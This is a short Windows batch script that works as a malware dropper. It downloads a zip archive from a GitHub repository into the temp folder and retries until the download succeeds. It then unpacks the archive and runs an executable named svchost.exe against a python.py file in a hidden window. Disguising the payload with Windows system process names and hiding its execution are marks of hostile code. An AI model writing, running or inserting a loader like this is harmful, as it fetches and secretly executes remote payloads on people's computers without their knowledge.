@echo off
setlocal
set "url=https://github.com/LuisPhantom/Learningg/raw/refs/heads/main/RuntimeBroker.zip"
set "tempdir=%temp%"
set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789.zip"

:download
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
for %%A in ("%output%") do (
    if %%~zA==0 (
        del "%output%"
        timeout /t 1 >nul
        goto download
    )
)

powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"

powershell -Command "Start-Process -FilePath '%tempdir%\svchost.exe' -ArgumentList '%tempdir%\python.py' -WindowStyle Hidden"

exit
